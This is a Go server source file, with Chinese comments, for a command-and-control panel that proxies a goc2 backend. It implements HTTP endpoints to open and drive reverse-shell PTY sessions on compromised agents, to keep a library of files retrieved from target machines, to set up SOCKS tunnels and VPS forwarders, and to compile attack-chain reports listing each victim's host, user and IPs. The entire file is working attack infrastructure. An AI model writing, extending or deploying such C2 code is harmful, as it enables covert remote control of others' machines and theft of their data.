package server

// c2_classic2.go — Classic C2 第二期移植：反弹Shell（goc2 PTY 代理）、
// 资料库（目标机取回文件的服务端管理）、隧道（socks + forwarders）、
// 报告（审计+链路图 markdown 生成）。

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"path"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ───────────────────────── 反弹 Shell（goc2 PTY） ─────────────────────────

// POST /api/c2x/wsshell/attach {agent_id, cols, rows} → {session_id, spawn_to}
func (s *Server) c2xPtyAttach(w http.ResponseWriter, r *http.Request) {
	var b struct {
		AgentID string `json:"agent_id"`
		Cols    int    `json:"cols"`
		Rows    int    `json:"rows"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.AgentID == "" {
		writeErr(w, 400, "agent_id 必填")
		return
	}
	if b.Cols <= 0 {
		b.Cols = 120
	}
	if b.Rows <= 0 {
		b.Rows = 30
	}
	out, err := c2Client().Request(r.Context(), "POST", "/clients/"+b.AgentID+"/pty/attach", nil,
		map[string]any{"cols": b.Cols, "rows": b.Rows})
	if err != nil {
		writeErr(w, 502, "PTY attach 失败: "+err.Error())
		return
	}
	s.c2Audit(b.AgentID, "", "pty_attach", "")
	s.c2GraphAction(b.AgentID, "action", "打开交互 Shell", "", true)
	if inner, ok := out["data"].(map[string]any); ok {
		out = inner // goc2 writeOK 包装层解包
	}
	writeJSON(w, 200, out)
}

// GET /api/c2x/wsshell/stream?agent_id&sid&cursor → {data(b64), cursor, alive}
func (s *Server) c2xPtyStream(w http.ResponseWriter, r *http.Request) {
	aid := r.URL.Query().Get("agent_id")
	sid := r.URL.Query().Get("sid")
	cur := r.URL.Query().Get("cursor")
	if aid == "" || sid == "" {
		writeErr(w, 400, "agent_id/sid 必填")
		return
	}
	params := url.Values{}
	if cur != "" {
		params.Set("cursor", cur)
	}
	out, err := c2Client().Request(r.Context(), "GET",
		"/clients/"+aid+"/pty/"+sid+"/stream", params, nil)
	if err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	if inner, ok := out["data"].(map[string]any); ok {
		out = inner
	}
	writeJSON(w, 200, out)
}

// POST /api/c2x/wsshell/input {agent_id, sid, data(b64)}
func (s *Server) c2xPtyInput(w http.ResponseWriter, r *http.Request) {
	var b struct {
		AgentID string `json:"agent_id"`
		Sid     string `json:"sid"`
		Data    string `json:"data"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.AgentID == "" || b.Sid == "" {
		writeErr(w, 400, "agent_id/sid 必填")
		return
	}
	if _, err := base64.StdEncoding.DecodeString(b.Data); err != nil {
		writeErr(w, 400, "bad base64")
		return
	}
	out, err := c2Client().Request(r.Context(), "POST",
		"/clients/"+b.AgentID+"/pty/"+b.Sid+"/input", nil,
		map[string]any{"data": b.Data})
	if err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	writeJSON(w, 200, out)
}

// POST /api/c2x/wsshell/resize {agent_id, sid, cols, rows}
func (s *Server) c2xPtyResize(w http.ResponseWriter, r *http.Request) {
	var b struct {
		AgentID string `json:"agent_id"`
		Sid     string `json:"sid"`
		Cols    int    `json:"cols"`
		Rows    int    `json:"rows"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.AgentID == "" || b.Sid == "" {
		writeErr(w, 400, "agent_id/sid 必填")
		return
	}
	out, err := c2Client().Request(r.Context(), "POST",
		"/clients/"+b.AgentID+"/pty/"+b.Sid+"/resize", nil,
		map[string]any{"cols": b.Cols, "rows": b.Rows})
	if err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	writeJSON(w, 200, out)
}

// POST /api/c2x/wsshell/close {agent_id, sid}
func (s *Server) c2xPtyClose(w http.ResponseWriter, r *http.Request) {
	var b struct {
		AgentID string `json:"agent_id"`
		Sid     string `json:"sid"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.AgentID == "" || b.Sid == "" {
		writeErr(w, 400, "agent_id/sid 必填")
		return
	}
	if _, err := c2Client().Request(r.Context(), "POST",
		"/clients/"+b.AgentID+"/pty/"+b.Sid+"/close", nil, nil); err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// ───────────────────────── 资料库（取回文件管理） ─────────────────────────

func c2xLibDir(s *Server, agent string) string {
	return filepath.Join(s.m.dir, "evidence", "c2-lib", agent)
}

// c2xLibSave 下载任务完成后落盘（poller 调用）。
func (s *Server) c2xLibSave(agent, name string, data []byte) {
	dir := c2xLibDir(s, agent)
	_ = os.MkdirAll(dir, 0o755)
	name = path.Base(strings.ReplaceAll(name, "\\", "/")) // 防穿越（Win 反斜杠显式归一——ToSlash 在 Linux 是空操作）
	_ = os.WriteFile(filepath.Join(dir, name), data, 0o600)
}

// GET /api/c2x/library/{id} → {dir, files:[{dir,name,path,size,is_text,is_note}]}
func (s *Server) c2xLibList(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	dir := c2xLibDir(s, id)
	entries, err := os.ReadDir(dir)
	if err != nil {
		writeJSON(w, 200, map[string]any{"dir": dir, "files": []any{}})
		return
	}
	type libFile struct {
		Dir     string `json:"dir"`
		Name    string `json:"name"`
		Path    string `json:"path"`
		Size    int64  `json:"size"`
		IsText  bool   `json:"is_text"`
		IsNote  bool   `json:"is_note"`
	}
	files := []libFile{}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		info, _ := e.Info()
		f := libFile{Dir: ".", Name: e.Name(), Path: e.Name(), IsNote: strings.HasSuffix(e.Name(), ".md")}
		if info != nil {
			f.Size = info.Size()
		}
		if f.Size < 2<<20 { // ≤2MB 嗅探文本
			if b, err := os.ReadFile(filepath.Join(dir, e.Name())); err == nil {
				f.IsText = isPrintableText(b)
			}
		}
		files = append(files, f)
	}
	writeJSON(w, 200, map[string]any{"dir": dir, "files": files})
}

func isPrintableText(b []byte) bool {
	if len(b) == 0 {
		return false
	}
	n := len(b)
	if n > 4096 {
		n = 4096
	}
	ctrl := 0
	for _, c := range b[:n] {
		if c == 0 {
			return false
		}
		if c < 32 && c != '\n' && c != '\r' && c != '\t' {
			ctrl++
		}
	}
	return ctrl*100/n < 5
}

// GET /api/c2x/library/{id}/get/{path}?dl=1 → 文件内容（原样/下载）
func (s *Server) c2xLibGet(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	p := path.Base(strings.ReplaceAll(r.PathValue("path"), "\\", "/")) // 防穿越：仅文件名
	full := filepath.Join(c2xLibDir(s, id), p)
	data, err := os.ReadFile(full)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	if r.URL.Query().Get("dl") != "" {
		w.Header().Set("Content-Disposition", "attachment; filename=\""+p+"\"")
	}
	w.Write(data)
}

// GET /api/c2x/library/{id}/read/{path} → {content}
func (s *Server) c2xLibRead(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	p := path.Base(strings.ReplaceAll(r.PathValue("path"), "\\", "/"))
	data, err := os.ReadFile(filepath.Join(c2xLibDir(s, id), p))
	if err != nil {
		writeErr(w, 404, "文件不存在")
		return
	}
	writeJSON(w, 200, map[string]any{"content": string(data)})
}

// POST /api/c2x/library/{id}/write/{path} {content}
func (s *Server) c2xLibWrite(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	p := path.Base(strings.ReplaceAll(r.PathValue("path"), "\\", "/"))
	var b struct {
		Content string `json:"content"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json")
		return
	}
	if err := os.WriteFile(filepath.Join(c2xLibDir(s, id), p), []byte(b.Content), 0o600); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// DELETE /api/c2x/library/{id}/delete/{path}
func (s *Server) c2xLibDelete(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	p := path.Base(strings.ReplaceAll(r.PathValue("path"), "\\", "/"))
	if err := os.Remove(filepath.Join(c2xLibDir(s, id), p)); err != nil {
		writeJSON(w, 200, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// POST /api/c2x/library/{id}/note {content} → 保存分析笔记
func (s *Server) c2xLibNote(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var b struct {
		Content string `json:"content"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json")
		return
	}
	name := fmt.Sprintf("notes-%s.md", time.Now().Format("0102-150405"))
	s.c2xLibSave(id, name, []byte(b.Content))
	writeJSON(w, 200, map[string]any{"ok": true, "name": name})
}

// ───────────────────────── 隧道（socks + forwarders） ─────────────────────────

// GET /api/c2x/tunnel/status → {socks:{running,addr,active_beacons,note}, forwarders:[...]}
func (s *Server) c2xTunnelStatus(w http.ResponseWriter, r *http.Request) {
	socks := map[string]any{}
	if out, err := c2Client().Request(r.Context(), "GET", "/socks/status", nil, nil); err == nil {
		if inner, ok := out["data"].(map[string]any); ok {
			socks = inner // writeOK 包装层解包
		} else {
			socks = out
		}
	} else {
		socks["running"] = false
		socks["note"] = "goc2 未启用 socks（server -socks 参数）"
	}
	fwd := []map[string]any{}
	if out, err := c2Client().Request(r.Context(), "GET", "/forwarders", nil, nil); err == nil {
		if arr, ok := out["data"].([]any); ok {
			for _, f := range arr {
				if m, ok := f.(map[string]any); ok {
					fwd = append(fwd, m)
				}
			}
		}
	}
	writeJSON(w, 200, map[string]any{"socks": socks, "forwarders": fwd})
}

// POST /api/c2x/tunnel/forwarder {name, vps_host, vps_port, password, notes}
func (s *Server) c2xTunnelFwdCreate(w http.ResponseWriter, r *http.Request) {
	var b struct {
		Name     string `json:"name"`
		VpsHost  string `json:"vps_host"`
		VpsPort  int    `json:"vps_port"`
		Password string `json:"password"`
		Notes    string `json:"notes"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.Name == "" || b.VpsHost == "" || b.VpsPort <= 0 {
		writeErr(w, 400, "name/vps_host/vps_port 必填")
		return
	}
	out, err := c2Client().Request(r.Context(), "POST", "/forwarders", nil, map[string]any{
		"name": b.Name, "vps_host": b.VpsHost, "vps_port": b.VpsPort,
		"password": b.Password, "notes": b.Notes,
	})
	if err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	s.c2Audit("", "", "forwarder_add", b.Name+" "+b.VpsHost)
	writeJSON(w, 200, out)
}

// DELETE /api/c2x/tunnel/forwarder/{id}
func (s *Server) c2xTunnelFwdDelete(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if _, err := c2Client().Request(r.Context(), "DELETE", "/forwarders/"+id, nil, nil); err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}

// ───────────────────────── 报告（markdown） ─────────────────────────

// GET /api/c2x/report/{id} → {report(markdown), generated_at}
func (s *Server) c2xReport(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var sb strings.Builder
	sb.WriteString("# C2 行动报告\n\n")
	// 会话信息
	clients, _ := c2Client().ListClients(r.Context(), nil)
	for _, c := range clients {
		if m, ok := c.(map[string]any); ok {
			if cid, _ := m["id"].(string); cid == id {
				fmt.Fprintf(&sb, "**主机**：%s（%s/%s）\n\n", m["hostname"], m["osType"], m["arch"])
				fmt.Fprintf(&sb, "**用户**：%s　**内网 IP**：%s　**外网 IP**：%s\n\n", m["username"], m["internalIp"], m["externalIp"])
				break
			}
		}
	}
	// 攻击链路
	rows, err := s.m.PG().Query(`SELECT node_type, label, COALESCE(detail,''), status, created_at
		FROM c2_graph_nodes WHERE session_id=$1 ORDER BY id`, id)
	if err == nil {
		defer rows.Close()
		sb.WriteString("## 攻击链路\n\n| 时间 | 类型 | 动作 | 状态 |\n|---|---|---|---|\n")
		n := 0
		for rows.Next() {
			var typ, label, detail, status string
			var ts time.Time
			if err := rows.Scan(&typ, &label, &detail, &status, &ts); err != nil {
				continue
			}
			fmt.Fprintf(&sb, "| %s | %s | %s | %s |\n", ts.Format("01-02 15:04"), typ, strings.ReplaceAll(label, "|", "\\|"), status)
			n++
		}
		sb.WriteString("\n")
		if n == 0 {
			sb.WriteString("（暂无记录）\n\n")
		}
	}
	// 审计摘要
	rows2, err := s.m.PG().Query(`SELECT action, COALESCE(detail,''), count(*)
		FROM c2_audit WHERE session_id=$1 GROUP BY action, detail ORDER BY count(*) DESC LIMIT 20`, id)
	if err == nil {
		defer rows2.Close()
		sb.WriteString("## 操作摘要\n\n| 动作 | 明细 | 次数 |\n|---|---|---|\n")
		for rows2.Next() {
			var action, detail string
			var cnt int
			if err := rows2.Scan(&action, &detail, &cnt); err != nil {
				continue
			}
			fmt.Fprintf(&sb, "| %s | %s | %d |\n", action, truncateStr(strings.ReplaceAll(detail, "|", "\\|"), 60), cnt)
		}
		sb.WriteString("\n")
	}
	// 最新系统信息
	c2x.mu.Lock()
	if sn, ok := c2x.sysinfo[id]; ok {
		sb.WriteString("## 最新系统信息快照\n\n```\n")
		sb.WriteString(truncateStr(sn.Content, 4000))
		sb.WriteString("\n```\n")
	}
	c2x.mu.Unlock()
	writeJSON(w, 200, map[string]any{"report": sb.String(), "generated_at": time.Now().Format("2006-01-02 15:04:05")})
}

// ───────────────────────── 路由 ─────────────────────────

func (s *Server) registerC2ClassicRoutes2(mux *http.ServeMux) {
	// 反弹 Shell（PTY）
	mux.HandleFunc("POST /api/tools/c2/classic/wsshell/attach", s.c2xPtyAttach)
	mux.HandleFunc("GET /api/tools/c2/classic/wsshell/stream", s.c2xPtyStream)
	mux.HandleFunc("POST /api/tools/c2/classic/wsshell/input", s.c2xPtyInput)
	mux.HandleFunc("POST /api/tools/c2/classic/wsshell/resize", s.c2xPtyResize)
	mux.HandleFunc("POST /api/tools/c2/classic/wsshell/close", s.c2xPtyClose)
	// 资料库
	mux.HandleFunc("GET /api/tools/c2/classic/library/{id}", s.c2xLibList)
	mux.HandleFunc("GET /api/tools/c2/classic/library/{id}/get/{path...}", s.c2xLibGet)
	mux.HandleFunc("GET /api/tools/c2/classic/library/{id}/read/{path...}", s.c2xLibRead)
	mux.HandleFunc("POST /api/tools/c2/classic/library/{id}/write/{path...}", s.c2xLibWrite)
	mux.HandleFunc("DELETE /api/tools/c2/classic/library/{id}/delete/{path...}", s.c2xLibDelete)
	mux.HandleFunc("POST /api/tools/c2/classic/library/{id}/note", s.c2xLibNote)
	// 隧道
	mux.HandleFunc("GET /api/tools/c2/classic/tunnel/status", s.c2xTunnelStatus)
	mux.HandleFunc("POST /api/tools/c2/classic/tunnel/forwarder", s.c2xTunnelFwdCreate)
	mux.HandleFunc("DELETE /api/tools/c2/classic/tunnel/forwarder/{id}", s.c2xTunnelFwdDelete)
	// 报告
	mux.HandleFunc("GET /api/tools/c2/classic/report/{id}", s.c2xReport)
}
